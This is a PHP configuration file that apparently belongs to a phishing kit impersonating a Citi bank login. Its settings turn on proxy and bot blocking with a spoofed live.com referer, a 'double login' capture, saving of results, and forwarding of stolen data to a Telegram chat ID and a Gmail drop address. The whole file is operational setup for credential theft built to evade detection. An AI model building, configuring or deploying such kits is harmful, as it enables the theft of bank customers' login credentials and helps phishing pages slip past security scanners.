<?php

$settings = array(
    
    "proxy_block"	=> "1",	// Detect Proxies & Block Them
	"send_mail"		=> "1",	// Send E-Mail 
	"save_results"	=> "1",	// Save Results 
	"telegram"		=> "1",
	"double_login"	=> "1", // Double Login
	"chat_id"		=> "-1001181474291",
	"bot_url"		=> "",	// Your Bot API Key
	"referer"		=> "https://live.com/",	// HTTP Referer For Antibots 
	"out"			=> "citi+login",	// Outcome Of AntiBots Forward 
	"email"			=> "j47198128@gmail.com",	// Your E-Mail
);
return $settings;


?>


